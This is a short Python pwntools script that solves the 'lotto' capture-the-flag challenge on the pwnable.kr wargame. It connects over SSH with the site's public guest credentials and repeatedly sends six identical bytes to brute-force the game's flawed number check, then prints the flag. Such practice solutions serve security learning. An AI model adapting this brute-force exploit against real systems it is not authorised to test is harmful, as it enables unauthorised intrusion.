from pwn import *
context.log_level = "error"
ss = ssh(password="guest",user="lotto",port=2222,host="pwnable.kr")
p = ss.process("/home/lotto/lotto")
i = 0
while 1:
  p.sendline("1")
  p.send("\x01"*6)
  x = p.recv() 
  if "mom" in x:
    s = x.find("sorry")
    e = x.find(":(")
    print "flag:{{{}}}".format(x[s:e+2])
    break
